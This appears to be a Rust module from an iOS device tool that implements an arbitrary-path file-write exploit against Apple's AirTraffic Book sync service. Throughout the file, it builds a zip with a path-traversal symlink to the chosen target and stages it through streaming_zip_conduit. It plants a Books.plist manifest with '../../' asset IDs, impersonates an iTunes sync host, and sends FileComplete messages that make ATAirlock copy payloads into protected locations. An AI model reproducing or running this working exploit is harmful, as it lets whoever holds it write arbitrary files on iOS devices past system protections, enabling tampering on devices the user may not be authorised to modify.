//! AirTraffic (com.apple.atc) arbitrary-path writes via Book sync.
//! Adapted from AirCard-iOS (MIT) — https://github.com/Mak5er/AirCard-iOS
//!
//! Pipeline per write batch:
//!   1. stage  — StreamingZip archive (symlink + payloads) through
//!               streaming_zip_conduit into /var/mobile/Media, plus a
//!               Books/Sync/Books.plist manifest via AFC.
//!   2. sync   — AirTraffic Book session; FileComplete messages make
//!               ATAirlock copy payloads through the symlink to the target.
//!   3. finish — clean up staging, restore Books state.

use std::io::Write as _;

use idevice::afc::opcode::AfcFopenMode;
use idevice::afc::AfcClient;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::logging::log;
use crate::tunnel::AppDeviceTunnel;

const SOURCE_PREFIX: &str = "tofs-src-";
const LINK_PREFIX: &str = "tofs-link-";

// ---------------------------------------------------------------------------
// Public entry points
// ---------------------------------------------------------------------------

/// Write one file to an absolute device path.
pub async fn write_file(
    tunnel: &mut AppDeviceTunnel,
    abs_path: &str,
    data: &[u8],
) -> Result<(), String> {
    let (dir, leaf) = split_dir_leaf(abs_path)?;
    write_files(tunnel, &dir, &[(leaf, data.to_vec())]).await
}

/// Write multiple files into `target_dir` (absolute device path).
/// Batch first (one ATC session); on failure, per-file retries.
pub async fn write_files(
    tunnel: &mut AppDeviceTunnel,
    target_dir: &str,
    files: &[(String, Vec<u8>)],
) -> Result<(), String> {
    if files.is_empty() {
        return Ok(());
    }
    if target_dir.is_empty() || !target_dir.starts_with('/') {
        return Err(format!("target_dir must be absolute, got '{target_dir}'"));
    }

    log(format!(
        "bridge: atc: writing {} file(s) into {target_dir}",
        files.len()
    ));

    let mut afc = tunnel.connect_afc().await?;
    let original_books = housekeeping(&mut afc).await;

    let batch_res = write_batch_inner(tunnel, &mut afc, target_dir, files).await;

    let final_res = match batch_res {
        Ok(()) => Ok(()),
        Err(batch_err) => {
            log(format!(
                "bridge: atc: batch failed ({batch_err}), falling back to per-file writes..."
            ));
            let mut first_err = batch_err;
            let mut all_ok = true;
            for (idx, (leaf, payload)) in files.iter().enumerate() {
                let mut ok = false;
                let mut last_err = String::new();
                for attempt in 1..=2 {
                    let one = [(leaf.clone(), payload.clone())];
                    match write_batch_inner(tunnel, &mut afc, target_dir, &one).await {
                        Ok(()) => {
                            ok = true;
                            break;
                        }
                        Err(e) => {
                            last_err = e;
                            if attempt < 2 {
                                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            }
                        }
                    }
                }
                if !ok {
                    all_ok = false;
                    first_err = format!("'{leaf}': {last_err}");
                    log(format!(
                        "bridge: atc: [{}/{}] '{leaf}' FAILED: {last_err}",
                        idx + 1,
                        files.len()
                    ));
                    break;
                }
                if idx + 1 < files.len() {
                    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                }
            }
            if all_ok {
                Ok(())
            } else {
                Err(first_err)
            }
        }
    };

    restore_books(&mut afc, original_books).await;

    match &final_res {
        Ok(()) => log(format!(
            "bridge: atc: wrote {} file(s) to {target_dir}",
            files.len()
        )),
        Err(e) => log(format!("bridge: atc: write failed: {e}")),
    }
    final_res
}

// ---------------------------------------------------------------------------
// Staging helpers
// ---------------------------------------------------------------------------

/// Snapshot Books sync state and remove stale sync files.
async fn housekeeping(afc: &mut AfcClient) -> Option<Vec<u8>> {
    let original = match afc.open("Books/Sync/Books.plist", AfcFopenMode::RdOnly).await {
        Ok(mut fd) => {
            let data = fd.read_entire().await.ok();
            let _ = fd.close().await;
            data
        }
        Err(_) => None,
    };

    // Clear stale sync state so ATAirlock picks up our manifest cleanly.
    for f in [
        "Books/Books.plist",
        "Books/Sync/Books.plist",
        "Books/Sync/Upload.plist",
        "Books/OutstandingAssets_4.sqlite",
        "Books/OutstandingAssets_4.sqlite-shm",
        "Books/OutstandingAssets_4.sqlite-wal",
    ] {
        let _ = afc.remove(f).await;
    }

    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    let _ = afc.mk_dir("Books").await;
    let _ = afc.mk_dir("Books/Sync").await;

    original
}

async fn restore_books(afc: &mut AfcClient, original: Option<Vec<u8>>) {
    if let Some(orig) = original {
        if let Ok(mut fd) = afc.open("Books/Sync/Books.plist", AfcFopenMode::WrOnly).await {
            let _ = fd.write_entire(&orig).await;
            let _ = fd.close().await;
        }
    } else {
        let _ = afc.remove("Books/Sync/Books.plist").await;
    }
}

// ---------------------------------------------------------------------------
// One staging + sync round
// ---------------------------------------------------------------------------

async fn write_batch_inner(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    target_dir: &str,
    files: &[(String, Vec<u8>)],
) -> Result<(), String> {
    let token = random_hex(10);
    let source = format!("{SOURCE_PREFIX}{token}");
    let link_destination = format!("{LINK_PREFIX}{token}");

    let link_identifier = format!("../../{source}/p0/p1/p2/link");
    let mut identifiers = vec![link_identifier];
    let mut destinations = vec![link_destination.clone()];

    for (idx, (leaf, _)) in files.iter().enumerate() {
        identifiers.push(format!("../../{source}/payload_{idx}"));
        destinations.push(format!("{link_destination}/{leaf}"));
    }

    let archive = build_archive_multi(target_dir, files)
        .map_err(|e| format!("build_archive: {e}"))?;
    let books_plist = build_books_plist(&identifiers)
        .map_err(|e| format!("build_books_plist: {e}"))?;

    // ── STEP 1: stage via streaming_zip_conduit ─────────────────────────────
    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit")
        .await?;

    let mut zip_init_dict = plist::Dictionary::new();
    zip_init_dict.insert("MediaSubdir".to_string(), plist::Value::String(source.clone()));
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
        .map_err(|e| format!("encode MediaSubdir: {e}"))?;
    zip_stream
        .write_all(&(init_buf.len() as u32).to_be_bytes())
        .await
        .map_err(|e| format!("write MediaSubdir length: {e}"))?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| format!("write MediaSubdir body: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    zip_stream
        .write_all(&archive)
        .await
        .map_err(|e| format!("write archive: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut resp_len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut resp_len_buf)
        .await
        .map_err(|e| format!("read zip response length: {e}"))?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    if resp_len > 16 * 1024 * 1024 {
        return Err(format!("zip conduit response too large: {resp_len}"));
    }
    let mut resp_body = vec![0u8; resp_len];
    zip_stream
        .read_exact(&mut resp_body)
        .await
        .map_err(|e| format!("read zip response body: {e}"))?;
    drop(zip_stream);

    // Verify staging in AFC
    let source_link = format!("{source}/p0/p1/p2/link");
    let source_first = format!("{source}/payload_0");
    if afc.get_file_info(&source).await.is_err()
        || afc.get_file_info(&source_link).await.is_err()
        || afc.get_file_info(&source_first).await.is_err()
    {
        let _ = afc.remove_all(&source).await;
        return Err("stage verification failed: extracted files not present in Media".into());
    }

    // Manifest
    let mut books_fd = afc
        .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
    books_fd
        .write_entire(&books_plist)
        .await
        .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
    let _ = books_fd.close().await;

    // ── STEP 2: AirTraffic sync ──────────────────────────────────────────────
    let mut atc_stream = tunnel.connect_service("com.apple.atc").await?;
    let res = atc_sync(&mut *atc_stream, &identifiers, &destinations).await;
    drop(atc_stream);

    // ── STEP 3: cleanup ──────────────────────────────────────────────────────
    let _ = afc.remove_all(&link_destination).await;
    let _ = afc.remove_all(&source).await;
    tokio::time::sleep(std::time::Duration::from_millis(300)).await;

    res
}

// ---------------------------------------------------------------------------
// AirTraffic session state machine
// ---------------------------------------------------------------------------

async fn atc_sync<S: AsyncReadExt + AsyncWriteExt + Unpin + ?Sized>(
    stream: &mut S,
    identifiers: &[String],
    destinations: &[String],
) -> Result<(), String> {
    // Wait for SyncAllowed; capture GrappaSupportInfo from Capabilities.
    let mut grappa_info: Option<(u32, u32, u32)> = None;
    for _ in 0..12 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            read_atc_dict(stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    if name == "Capabilities" {
                        if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
                            if let Some(gi) =
                                params.get("GrappaSupportInfo").and_then(|g| g.as_dictionary())
                            {
                                let ver = gi
                                    .get("version")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                let dt = gi
                                    .get("deviceType")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(0) as u32;
                                let pv = gi
                                    .get("protocolVersion")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                grappa_info = Some((ver, dt, pv));
                            }
                        }
                    }
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => {}
        }
    }

    // HostInfo (Session = 0)
    let mut host_info_dict = plist::Dictionary::new();
    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("27.0".into()));
    host_info_dict.insert("SyncHostName".into(), plist::Value::String("3105".into()));
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        random_hex(4),
        random_hex(2),
        random_hex(2),
        random_hex(2),
        random_hex(6)
    );
    host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info_dict.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));

    let grappa_token = crate::grappa::generate_grappa_token(grappa_info, |s| log(s));
    if let Some(ref token) = grappa_token {
        host_info_dict.insert("Grappa".into(), plist::Value::Data(token.clone()));
    }

    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict.clone()));
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));

    send_atc_dict(stream, &make_atc_msg("HostInfo", 0, Some(host_info_params))).await?;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // RequestingSync (Session = 1)
    let mut sync_req_params = plist::Dictionary::new();
    sync_req_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_req_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
    if let Some(token) = grappa_token {
        sync_req_params.insert("Grappa".into(), plist::Value::Data(token));
    }
    send_atc_dict(stream, &make_atc_msg("RequestingSync", 1, Some(sync_req_params))).await?;

    // Wait for ReadyForSync (answer Pings, tolerate prior-session SyncFailed)
    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(stream)).await {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    match name.as_str() {
                        "Ping" => {
                            let _ = send_atc_dict(stream, &make_atc_msg("Pong", 1, None)).await;
                            continue;
                        }
                        "ReadyForSync" | "AssetManifest" => {
                            ready = true;
                            break;
                        }
                        "SyncFailed" => continue,
                        _ => {}
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC read error: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err("AirTraffic: ReadyForSync not observed (is Apple Books installed and was it opened once?)".into());
    }

    // FinishedSyncingMetadata (Session = 1)
    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    send_atc_dict(
        stream,
        &make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params)),
    )
    .await?;

    // Wait for AssetManifest
    let mut manifest_observed = false;
    for _ in 0..20 {
        match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(stream)).await {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    match name.as_str() {
                        "Ping" => {
                            let _ = send_atc_dict(stream, &make_atc_msg("Pong", 1, None)).await;
                            continue;
                        }
                        "AssetManifest" => {
                            manifest_observed = true;
                            break;
                        }
                        "SyncFinished" => break,
                        "SyncFailed" => continue,
                        _ => {}
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest_observed {
        return Err("AirTraffic: AssetManifest not observed (is Apple Books installed?)".into());
    }

    // FileComplete for each asset (link first, then payloads)
    for (idx, (id, dest)) in identifiers.iter().zip(destinations.iter()).enumerate() {
        let mut fc = plist::Dictionary::new();
        fc.insert("AssetID".into(), plist::Value::String(id.clone()));
        fc.insert("Dataclass".into(), plist::Value::String("Book".into()));
        fc.insert("AssetPath".into(), plist::Value::String(dest.clone()));
        send_atc_dict(stream, &make_atc_msg("FileComplete", 1, Some(fc))).await?;

        if idx == 0 {
            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
        } else if idx + 1 < identifiers.len() {
            tokio::time::sleep(std::time::Duration::from_millis(150)).await;
        }
    }

    // Let ATAirlock finish moving assets
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    Ok(())
}

// ---------------------------------------------------------------------------
// ATC wire format (little-endian u32 length + binary plist)
// ---------------------------------------------------------------------------

fn atc_message_name(dict: &plist::Dictionary) -> Option<String> {
    if let Some(plist::Value::String(s)) = dict.get("Command") {
        return Some(s.clone());
    }
    if let Some(plist::Value::String(s)) = dict.get("MessageName") {
        return Some(s.clone());
    }
    None
}

fn make_atc_msg(command: &str, session: i64, params: Option<plist::Dictionary>) -> plist::Dictionary {
    let mut msg = plist::Dictionary::new();
    msg.insert("Command".into(), plist::Value::String(command.into()));
    msg.insert("Session".into(), plist::Value::Integer(session.into()));
    if let Some(p) = params {
        msg.insert("Params".into(), plist::Value::Dictionary(p));
    }
    msg
}

async fn read_atc_dict<S: AsyncReadExt + Unpin + ?Sized>(
    stream: &mut S,
) -> Result<plist::Dictionary, String> {
    let mut len_buf = [0u8; 4];
    stream
        .read_exact(&mut len_buf)
        .await
        .map_err(|e| format!("read length: {e}"))?;
    let len_le = u32::from_le_bytes(len_buf) as usize;
    let len_be = u32::from_be_bytes(len_buf) as usize;
    let len = if len_le > 0 && len_le <= 10 * 1024 * 1024 {
        len_le
    } else if len_be > 0 && len_be <= 10 * 1024 * 1024 {
        len_be
    } else {
        return Err(format!("ATC message length invalid: {len_buf:?}"));
    };
    let mut body = vec![0u8; len];
    stream
        .read_exact(&mut body)
        .await
        .map_err(|e| format!("read body (len={len}): {e}"))?;
    let val: plist::Value = plist::from_bytes(&body).map_err(|e| format!("decode plist: {e}"))?;
    match val {
        plist::Value::Dictionary(d) => Ok(d),
        _ => Err("expected plist dictionary".into()),
    }
}

async fn send_atc_dict<S: AsyncWriteExt + Unpin + ?Sized>(
    stream: &mut S,
    dict: &plist::Dictionary,
) -> Result<(), String> {
    let mut buf = Vec::new();
    let top = plist::Value::Dictionary(dict.clone());
    plist::to_writer_binary(&mut buf, &top).map_err(|e| format!("encode plist: {e}"))?;
    stream
        .write_all(&(buf.len() as u32).to_le_bytes())
        .await
        .map_err(|e| format!("write length: {e}"))?;
    stream
        .write_all(&buf)
        .await
        .map_err(|e| format!("write body: {e}"))?;
    stream.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Archive builders
// ---------------------------------------------------------------------------

fn build_archive_multi(
    target: &str,
    files: &[(String, Vec<u8>)],
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use zip::{write::ExtendedFileOptions, write::FileOptions, CompressionMethod, ZipWriter};

    let target_tail = target.trim_start_matches('/');
    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(std::io::Cursor::new(&mut buf));

    fn zip_opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut opts = FileOptions::default()
            .compression_method(CompressionMethod::Stored)
            .unix_permissions(mode);
        let mode_bytes = (mode as u16).to_le_bytes();
        let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
        opts
    }

    zip.add_directory("META-INF/", zip_opts(0o040755))?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist)?;
    zip.write_all(&meta_buf)?;

    for dir in &["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(*dir, zip_opts(0o040755))?;
    }

    zip.add_symlink(
        "p0/p1/p2/link",
        format!("../../../{target_tail}"),
        zip_opts(0o120777),
    )?;

    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        zip.add_directory(&cursor, zip_opts(0o040755))?;
    }

    for (idx, (_, payload)) in files.iter().enumerate() {
        zip.start_file(format!("payload_{idx}"), zip_opts(0o100600))?;
        zip.write_all(payload)?;
    }
    zip.finish()?;
    Ok(buf)
}

fn build_books_plist(
    identifiers: &[String],
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    let rows: Vec<plist::Value> = identifiers
        .iter()
        .enumerate()
        .map(|(i, id)| {
            let mut d = plist::Dictionary::new();
            d.insert("Persistent ID".to_owned(), plist::Value::String(id.clone()));
            d.insert("Item ID".to_owned(), plist::Value::String((i + 1).to_string()));
            d.insert("DSID".to_owned(), plist::Value::String("1".to_owned()));
            plist::Value::Dictionary(d)
        })
        .collect();
    let mut top = plist::Dictionary::new();
    top.insert("Books".to_owned(), plist::Value::Array(rows));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &top)?;
    Ok(buf)
}

// ---------------------------------------------------------------------------
// Misc
// ---------------------------------------------------------------------------

fn split_dir_leaf(abs_path: &str) -> Result<(String, String), String> {
    let p = abs_path.trim_end_matches('/');
    let Some(idx) = p.rfind('/') else {
        return Err(format!("path has no directory component: '{abs_path}'"));
    };
    let (dir, leaf) = (p[..idx].to_string(), p[idx + 1..].to_string());
    if dir.is_empty() || leaf.is_empty() {
        return Err(format!("bad path: '{abs_path}'"));
    }
    Ok((dir, leaf))
}

fn random_hex(n: usize) -> String {
    use std::io::Read;
    let mut buf = vec![0u8; n];
    std::fs::File::open("/dev/urandom")
        .and_then(|mut f| f.read_exact(&mut buf))
        .unwrap_or_else(|_| {
            use std::collections::hash_map::DefaultHasher;
            use std::hash::{Hash, Hasher};
            use std::time::{SystemTime, UNIX_EPOCH};
            let mut h = DefaultHasher::new();
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .subsec_nanos()
                .hash(&mut h);
            std::thread::current().id().hash(&mut h);
            let v = h.finish().to_le_bytes();
            for (i, b) in buf.iter_mut().enumerate() {
                *b = v[i % 8] ^ (i as u8);
            }
        });
    hex::encode(&buf)
}
